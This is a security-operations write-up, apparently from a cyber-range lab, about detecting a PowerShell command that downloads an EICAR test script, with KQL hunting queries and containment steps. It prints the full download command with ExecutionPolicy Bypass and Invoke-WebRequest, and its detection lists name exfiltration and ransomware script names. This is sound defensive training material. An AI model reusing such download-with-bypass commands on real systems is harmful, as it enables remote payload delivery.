# Detection and Analysis – VM PowerShell Script Execution

## Incident Overview

* **Scenario:** Virtual machine (`th--dp--win11`) executed a suspicious PowerShell command.
* **Command Observed:**

  ```powershell
  powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest `
  -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 `
  -OutFile C:\programdata\eicar.ps1
  ```
* **Initial Finding:** The command downloaded a file named `eicar.ps1` from GitHub to the machine.
* **Significance:**

  * **ExecutionPolicy Bypass** → indicates intentional circumvention of PowerShell security restrictions.
  * **Invoke-WebRequest** → common TTP for malicious payload delivery (MITRE ATT\&CK: **T1105 – Ingress Tool Transfer**, **T1059 – Command & Scripting Interpreter**).

---

## Investigation Actions

### 1. Validate the Suspicious File

* **File Identified:** `eicar.ps1`
* **Content:** Harmless EICAR test file (used for simulating malware).
* **Note:** In real incidents, files should be “defanged” in notes (e.g., `hxxp://...` instead of `http://...`) to prevent accidental execution.

---

### 2. User Verification

* Contacted the affected user on `th--dp--win11`.
* Goal: Confirm timeline of actions and determine if execution was intentional or accidental.
* Outcome: Pending user feedback (would align with forensic timeline).

---

### 3. Endpoint Process Analysis

* **Query – Local Device (scoped):**

  ```kql
  let TargetHostname = "th--dp--win11"; 
  let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]); 
  DeviceProcessEvents
  | where DeviceName == TargetHostname
  | where FileName == "powershell.exe"
  | where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
  | order by TimeGenerated
  | project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
  ```
* **Result:** 2 events found on the host (`th--dp--win11`).

---

### 4. Enterprise-Wide Query

* **Query – Expanded Scope (all devices):**

  ```kql
  let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]); 
  DeviceProcessEvents
  | where FileName == "powershell.exe"
  | where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
  | order by TimeGenerated
  | project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
  ```
* **Result:** 75 executions across multiple devices.
* **Analysis:** Widespread execution confirmed → potential lateral spread or centralized distribution method.

---

### 5. Escalation & Triage

* Passed `eicar.ps1` to **Malware Reverse Engineering** team for validation (simulated).
* SOC decision: Treat as **widespread malware distribution event**.

---

## Detection Findings

* **Affected Hosts:** Multiple (75 devices).
* **Method:** PowerShell execution with ExecutionPolicy Bypass.
* **Payload:** EICAR test script (`eicar.ps1`).
* **Risk:** High – if malicious, this technique would bypass controls and allow attacker persistence/command execution.

---

## Immediate Next Steps

1. **Isolate affected machines** (containment).
2. **Run antivirus/EDR scans** on each device.
3. **Block outbound PowerShell web requests** for non-admin users.
4. **Update local policies:**

   * Restrict non-privileged users from running `.ps1` scripts.
   * Enforce stricter ExecutionPolicy for endpoints.
5. **Awareness:**

   * Affected users to complete follow-up **KnowBe4 training**.
   * Broader organization to receive updated awareness module on “script-based attacks.”

---

## Lessons for Future Detection

* Create **custom Sentinel rule** for:

  * `powershell.exe` + `-ExecutionPolicy Bypass`
  * `Invoke-WebRequest` or `Invoke-Expression` usage.
* Enhance hunting queries to include:

  * Frequency analysis of script execution.
  * New file creation in sensitive directories (e.g., `C:\programdata`).

---
